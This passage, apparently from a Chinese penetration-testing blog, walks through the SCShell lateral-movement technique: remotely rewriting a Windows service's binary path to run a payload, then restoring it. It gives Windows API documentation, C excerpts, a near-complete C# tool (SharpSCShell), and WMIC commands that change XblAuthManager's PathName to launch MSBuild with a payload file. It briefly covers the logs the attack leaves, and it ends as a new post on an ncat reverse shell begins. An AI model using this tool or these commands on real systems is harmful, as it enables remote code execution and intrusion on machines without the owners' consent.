class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>hSCManager：</em></strong>服务控制管理器数据库的句柄。</li><li><strong><em>lpServiceName：</em></strong>要打开的服务的名称。该参数是由 <code>CreateService</code> 函数的 <code>lpServiceName</code> 参数指定的名称，而不是用户界面应用程序显示的用于标识服务显示名称。</li><li><strong><em>dwDesiredAccess：</em></strong>访问服务。此处应为 <code>SERVICE_ALL_ACCESS</code>，囊括了列表中的所有权限。有关访问权限列表可参阅【<a href="https://docs.microsoft.com/zh-cn/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener">服务安全和访问权限</a>】</li><li><strong><em>返回值：</em></strong> 返回指定服务的句柄。</li></ul><h3 id="1-5、QueryServiceConfigA"><a href="#1-5、QueryServiceConfigA" class="headerlink" title="1.5、QueryServiceConfigA"></a>1.5、QueryServiceConfigA</h3><p>检索指定服务的配置参数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">QueryServiceConfigA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE               hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPQUERY_SERVICE_CONFIGA lpServiceConfig,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                   cbBufSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD                 pcbBytesNeeded</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>hService：</em></strong>指定服务的句柄。</li><li><strong><em>lpServiceConfig：</em></strong>指向接收服务配置信息的缓冲区的指针。该数组的最大大小为 8KB。若要确定所需的大小，请设置为 NULL，而 <code>cbBufSize</code> 指定为 0。</li><li><strong><em>cbBufSize：</em></strong>指向的缓冲区大小（以字节为单位）。</li><li><strong><em>pcbBytesNeeded：</em></strong>如果函数失败并显示 <code>ERROR_INSUFFICIENT_BUFFER</code>，则该变量的指针将接收存储所有配置信息所需的字节数。</li><li><strong><em>返回值：</em></strong> 非零值。</li></ul><h3 id="1-6、ChangeServiceConfigA"><a href="#1-6、ChangeServiceConfigA" class="headerlink" title="1.6、ChangeServiceConfigA"></a>1.6、ChangeServiceConfigA</h3><p>更改指定服务的配置参数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ChangeServiceConfigA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwServiceType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwStartType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwErrorControl,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpBinaryPathName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpLoadOrderGroup,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD   lpdwTagId,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDependencies,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpServiceStartName,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpPassword,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    lpDisplayName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>hService：</em></strong>指定服务的句柄。</li><li><strong><em>dwServiceType：</em></strong>服务类型。如果不更改现有服务类型，则指定 <code>SERVICE_NO_CHANGE</code>。</li><li><strong><em>dwStartType：</em></strong>服务启动选项。如果不更改现有的启动类型，则指定 <code>SERVICE_NO_CHANGE</code>。因为要执行命令，所以使用 <code>SERVICE_DEMAND_START</code>，后续调用 <code>StartService</code> 函数时启动服务。</li><li><strong><em>dwErrorControl：</em></strong>如果此服务无法启动，应该采取措施应对这个错误。此处应为 <code>SERVICE_ERROR_IGNORE</code>，忽略该错误并继续启动操作。</li><li><strong><em>lpBinaryPathName：</em></strong>服务二进制文件的标准现有路径。如果不更改现有路径，请指定 NULL。如果路径包含空格，则必须使用引号括起来。该路径中还可包含二进制文件的参数。</li><li><strong><em>lpLoadOrderGroup：</em></strong>该服务所属的负载排列组的名称。如果不更改现有组，请指定 NULL。</li><li><strong><em>lpdwTagId：</em></strong>指向变量的指针，该变量接收在 <code>lpLoadOrderGroup</code> 参数指定的组中唯一的标记值。如果不更改现有标签，请指定 NULL。</li><li><strong><em>lpDependencies：</em></strong>指向双 NULL 终止的数组，该数组以空分隔的服务或装入顺序组的名称分隔，系统必须在启动该服务之前才能启动这些名称。（对组的依赖性意味着，在尝试启动该组的所有成员之后，如果该组的至少一个成员正在运行，则该服务可以运行。）如果不更改现有的依赖性，则指定 NULL。</li><li><strong><em>lpServiceStartName：</em></strong>服务将在其下运行的帐户的名称。如果不更改现有帐户名，则指定 NULL。</li><li><strong><em>lpPassword：</em></strong><code>lpServiceStartName</code> 参数指定的帐户名的密码。如果不更改现有密码，请指定 NULL。</li><li><strong><em>lpDisplayName：</em></strong>用来为其用户标识服务的显示名称。如果不更改现有的显示名称，则指定 NULL。</li><li><strong><em>返回值：</em></strong> 非零值。</li></ul><h3 id="1-7、StartServiceA"><a href="#1-7、StartServiceA" class="headerlink" title="1.7、StartServiceA"></a>1.7、StartServiceA</h3><p>启动指定服务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">StartServiceA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  SC_HANDLE hService,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD     dwNumServiceArgs,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR    *lpServiceArgVectors</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><strong><em>hService：</em></strong>要启动的服务的句柄。由 <code>OpenService</code> 返回。</li><li><strong><em>dwNumServiceArgs：</em></strong><code>lpServiceArgVectors</code> 数组中的字符串数。如果 <code>lpServiceArgVectors</code> 为 NULL，则此参数可以为 0。</li><li><strong><em>lpServiceArgVectors：</em></strong>以空值结尾的字符串将作为参数传递给服务的 <code>ServiceMain</code> 函数。如果没有参数，则此参数可以为 NULL。</li><li><strong><em>返回值：</em></strong> 非零值。</li></ul><h2 id="0x02-技术细节"><a href="#0x02-技术细节" class="headerlink" title="0x02 技术细节"></a>0x02 技术细节</h2><h3 id="2-1、时序图"><a href="#2-1、时序图" class="headerlink" title="2.1、时序图"></a>2.1、时序图</h3><p><img src="/image/【渗透技巧】SCshell 技术细节/diagram.svg" alt=""></p><p>这一整个过程与 <code>PsExec</code> 操作服务的步骤大部分相同，区别仅是因为 <code>SCshell</code>是更改配置，而 <code>PsExec</code> 是创建服务。以下内容是作者的代码实现（典型的 API 调用方式编程）。</p><h3 id="2-2、登陆"><a href="#2-2、登陆" class="headerlink" title="2.2、登陆"></a>2.2、登陆</h3><p>使用 <code>LogonUserA</code> 登陆。后使用 <code>ImpersonateLoggedOnUser</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(username != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Username was provided attempting to call LogonUserA\n"</span>);</span><br><span class="line">    bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &amp;hToken);</span><br><span class="line">    <span class="keyword">if</span>(!bResult) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"LogonUserA failed %ld\n"</span>, GetLastError());</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">bResult = FALSE;</span><br><span class="line">bResult = ImpersonateLoggedOnUser(hToken);</span><br></pre></td></tr></table></figure><h3 id="2-3、Service-Manager"><a href="#2-3、Service-Manager" class="headerlink" title="2.3、Service Manager"></a>2.3、Service Manager</h3><p>一旦当前进程获取了正确的身份验证，即可使用 <code>OpenSCManagerA</code>  打开远程机器的服务控制管理器，并且获取其数据库的句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span>(schManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenSCManagerA failed %ld\n"</span>, GetLastError());</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"SC_HANDLE Manager 0x%p\n"</span>, schManager);</span><br></pre></td></tr></table></figure><p>与该数据库句柄进行交互即可。通过该数据库句柄，使用 <code>OpenServiceA</code> 打开需要的现有服务。比如作者在演示中使用的是 <code>XblAuthManager</code> 服务。后续使用中，为了更方便使用，可以选择一些较为通用的服务代替。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Opening %s\n"</span>, serviceName);</span><br><span class="line">SC_HANDLE schService = OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);</span><br><span class="line"><span class="keyword">if</span>(schService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OpenServiceA failed %ld\n"</span>, GetLastError());</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SC_HANDLE Service 0x%p\n"</span>, schService);</span><br></pre></td></tr></table></figure><p>之所以要查询服务的配置信息，是为了获取原始服务二进制的路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">QueryServiceConfigA(schService, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwSize);</span><br><span class="line"><span class="keyword">if</span>(dwSize) &#123;</span><br><span class="line">  <span class="comment">// This part is not critical error will not stop the program</span></span><br><span class="line">  dwLpqscSize = dwSize;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n"</span>, dwLpqscSize);</span><br><span class="line">  lpqsc = GlobalAlloc(GPTR, dwSize);</span><br><span class="line">  bResult = FALSE;</span><br><span class="line">  bResult = QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &amp;dwSize);</span><br><span class="line">  originalBinaryPath = lpqsc-&gt;lpBinaryPathName;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Original service binary path \"%s\"\n"</span>, originalBinaryPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>ChangeServiceConfigA</code> 更改已打开的服务的配置。通常可以直接使用 <code>C:\Windows\System32\cmd.exe args1 args2</code> 这样的配置替换掉二进制文件路径中的内容。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>通过调用 <code>StartService</code> 函数时启动已更改配置的服务。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bResult = StartServiceA(schService, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>最后再次使用 <code>ChangeServiceConfigA</code> 还原服务的配置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dwLpqscSize) &#123;</span><br><span class="line">  bResult = FALSE;</span><br><span class="line">  bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span>(!bResult) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ChangeServiceConfigA failed to revert the service path. %ld\n"</span>, GetLastError());</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Service path was restored to \"%s\"\n"</span>, originalBinaryPath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个过程还是比较简单的。</p><h2 id="0x03-C-实现"><a href="#0x03-C-实现" class="headerlink" title="0x03 C# 实现"></a>0x03 C# 实现</h2><p>能在 MSDN 中找到的函数，在 <code>pinvoke.net</code> 中基本能找到对相应的例子，所以直接引用即可。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Console.WriteLine();</span><br><span class="line">Console.WriteLine(<span class="string">"=============== SharpSCShell --&gt; Revised at Rcoil (C# version) =============== "</span>);</span><br><span class="line">Console.WriteLine();</span><br><span class="line"><span class="keyword">if</span> (args.Length &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"SharpSCShell.exe target service payload domain username password"</span>);</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">"[*] Trying to connect to &#123;0&#125;"</span>, target);</span><br><span class="line"><span class="keyword">bool</span> bResult = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (username != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] Username was provided attempting to call LogonUser"</span>);</span><br><span class="line">bResult = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, <span class="keyword">ref</span> phToken);</span><br><span class="line"><span class="keyword">if</span> (!bResult)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] LogonUser failed. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bResult = ImpersonateLoggedOnUser(phToken);</span><br><span class="line"><span class="keyword">if</span> (!bResult)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] ImpersonateLoggedOnUser failed. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IntPtr SCMHandle = OpenSCManager(target, <span class="literal">null</span>, (<span class="keyword">uint</span>)SCM_ACCESS.SC_MANAGER_ALL_ACCESS);</span><br><span class="line"><span class="keyword">if</span> (SCMHandle == IntPtr.Zero)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] OpenSCManagerA failed! Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] SC_HANDLE Manager 0x&#123;0&#125;"</span>, SCMHandle);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">"[*] Opening &#123;0&#125; Service ...."</span>, ServiceName);</span><br><span class="line">IntPtr schService = OpenService(SCMHandle, ServiceName, ((<span class="keyword">uint</span>)SERVICE_ACCESS.SERVICE_ALL_ACCESS));</span><br><span class="line">Console.WriteLine(<span class="string">"[*] SC_HANDLE Service 0x&#123;0&#125;"</span>, schService);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QueryServiceConfigStruct qscs = <span class="keyword">new</span> QueryServiceConfigStruct();</span><br><span class="line">IntPtr qscPtr = Marshal.AllocCoTaskMem(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> retCode = QueryServiceConfig(schService, qscPtr, <span class="number">0</span>, <span class="keyword">ref</span> bytesNeeded);</span><br><span class="line"><span class="keyword">if</span> (retCode == <span class="number">0</span> &amp;&amp; bytesNeeded == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] QueryServiceConfig failed to read the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] LPQUERY_SERVICE_CONFIGA need &#123;0&#125; bytes"</span>, bytesNeeded);</span><br><span class="line">qscPtr = Marshal.AllocCoTaskMem(bytesNeeded);</span><br><span class="line">retCode = QueryServiceConfig(schService, qscPtr, bytesNeeded, <span class="keyword">ref</span> bytesNeeded);</span><br><span class="line">qscs.binaryPathName = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">qscs = (QueryServiceConfigStruct)Marshal.PtrToStructure(qscPtr, <span class="keyword">new</span> QueryServiceConfigStruct().GetType());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span> originalBinaryPath = Marshal.PtrToStringAuto(qscs.binaryPathName);</span><br><span class="line">Console.WriteLine(<span class="string">"[*] Original service binary path \"&#123;0&#125;\""</span>, originalBinaryPath);</span><br><span class="line">Marshal.FreeCoTaskMem(qscPtr);</span><br><span class="line"></span><br><span class="line">bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (!bResult)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] ChangeServiceConfigA failed to update the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] Service path was changed to \"&#123;0&#125;\""</span>, payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bResult = StartService(schService, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">uint</span> dwResult = GetLastError();</span><br><span class="line"><span class="keyword">if</span> (!bResult &amp;&amp; dwResult != <span class="number">1053</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] StartServiceA failed to start the service. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] Service was started"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (!bResult)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[!] ChangeServiceConfigA failed to revert the service path. Error:&#123;0&#125;"</span>, GetLastError());</span><br><span class="line">Environment.Exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"[*] Service path was restored to \"&#123;0&#125;\""</span>, originalBinaryPath);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><em>运行结果：</em></strong></p><p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_23-14-22.png" alt=""></p><p><strong><em>运行流量：</em></strong></p><p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_21-18-55.png" alt=""></p><p>可以较为明显的看到是 <code>DCE/RPC</code> 协议进行的，且整个过程的 API 调用看得清清楚楚。</p><p>项目源码已发布至 Github，请注意查收：<a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpSCShell" target="_blank" rel="noopener">SharpSCShell</a>，并将此源码合并至作者的 <a href="https://github.com/Mr-Un1k0d3r/SCShell" target="_blank" rel="noopener">SCShell</a></p><h2 id="0x04-日志"><a href="#0x04-日志" class="headerlink" title="0x04 日志"></a>0x04 日志</h2><p>使用用户凭证连接目标时，会留下正常的登陆日志，4624。同时如果服务超时，也会产生 7009 日志。当然，如果直接使用 ELK 监视事件 ID 4657，也是有惊喜的，而且很明显。</p><p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_20-59-37.png" alt=""></p><p><img src="/image/【渗透技巧】SCshell 技术细节/blog_2019-12-11_21-00-30.png" alt=""></p><p>该工具经过测试，当防火墙打开时无法连接，且大部分命令无法执行，原因有待探究。</p><h2 id="0x05-WMIC"><a href="#0x05-WMIC" class="headerlink" title="0x05 WMIC"></a>0x05 WMIC</h2><p><code>WMIC</code>  与 <code>SCShell</code> 有类似的功能。</p><p><strong><em>步骤1：</em></strong> 获取目标服务的当前 <code>pathName</code>，以便我们在运行命令后就可以将其还原（在本例中为 <code>XblAuthManager</code>）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> get pathName</span><br></pre></td></tr></table></figure><p><strong><em>步骤2：</em></strong>将 <code>pathName</code> 更改为要运行的任何命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call change PathName=<span class="string">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml"</span></span><br></pre></td></tr></table></figure><p><strong><em>步骤3：</em></strong>启动修改后的服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call startservice</span><br></pre></td></tr></table></figure><p><strong><em>步骤4：</em></strong>将服务 <code>pathName</code> 更改回其原始值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name=<span class="string">'XblAuthManager'</span> call change PathName=<span class="string">"C:\Windows\system32\svchost.exe -k netsvcs"</span></span><br></pre></td></tr></table></figure><p>这一部分本来打算另起一文，在写 WMI 放入，但想想之后的文章还是留在知识星球进行自我沉淀。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;估计最近一段时间不再更新 blog，要更新的话也是对之前的文章修修补补。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="SCShell" scheme="https://rcoil.me/tags/SCShell/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】命名管道</title>
    <link href="https://rcoil.me/2019/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/"/>
    <id>https://rcoil.me/2019/11/【知识回顾】命名管道/</id>
    <published>2019-11-04T11:52:59.000Z</published>
    <updated>2019-11-04T07:20:23.596Z</updated>
    
    <content type="html"><![CDATA[<p>本文是根据之前文章中涉及到的命名管道的一个理解和延伸进行编写的。</p><p><strong><em>PS</em></strong>：本文开始是投稿于安全客。但由于和别的稿件冲突了，相比下另一篇在原理探究，利用上会稍详尽一些些。只能说两篇文章是从不同角度进行的，建议结合阅读，文章连接：<a href="https://www.anquanke.com/post/id/190207#h2-0" target="_blank" rel="noopener">Windows 命名管道研究初探</a>。</p><a id="more"></a><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>之前在写 <a href="https://rcoil.me/2019/08/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/">深入了解 PsExec [知识回顾]</a>和了解 <code>SMB Beacon</code> 的时候，知道了它们都是通过【知识回顾】命名管道进行通信，所以本文通过一个常见的场景进行编写并绕过说明。</p><p><strong>场景建立</strong>：在 Windows 环境中，无管理员权限的情况下，对已获取权限的机器上使用 <code>ncat</code> 反弹一个 <code>shell</code>，但是遭到防火墙或反病毒程序的阻拦 。</p><h2 id="0x01-Windows-防火墙行为分析"><a href="#0x01-Windows-防火墙行为分析" class="headerlink" title="0x01 Windows 防火墙行为分析"></a>0x01 Windows 防火墙行为分析</h2><p>在 Windows 中，当尝试使用 <code>Bind()</code> 绑定一个 <code>TCP Socket</code> 时，<strong>Defender</strong> 